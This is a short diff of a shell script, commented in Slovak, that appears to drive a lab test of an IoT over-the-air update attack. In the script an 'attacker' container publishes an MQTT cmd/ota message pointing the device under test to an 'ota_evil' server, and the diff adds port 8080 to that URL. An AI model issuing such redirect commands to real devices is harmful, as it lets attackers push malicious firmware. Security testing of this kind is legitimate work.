@@ -43,7 +43,7 @@ echo "=== OTA ATTACK (evil server redirect) ==="
 echo ""
 echo "[1] Attacker posiela cmd/ota s URL evil servera..."
 docker compose exec -T attacker \
-  mosquitto_pub -h mosquitto -p 1883 -t cmd/ota -m "http://ota_evil" -d
+  mosquitto_pub -h mosquitto -p 1883 -t cmd/ota -m "http://ota_evil:8080" -d
 echo "EVIL_TRIGGER_SENT" >> "$OUTLOG"
 echo ""
 echo "[2] Cakam na DUT reakciu..."
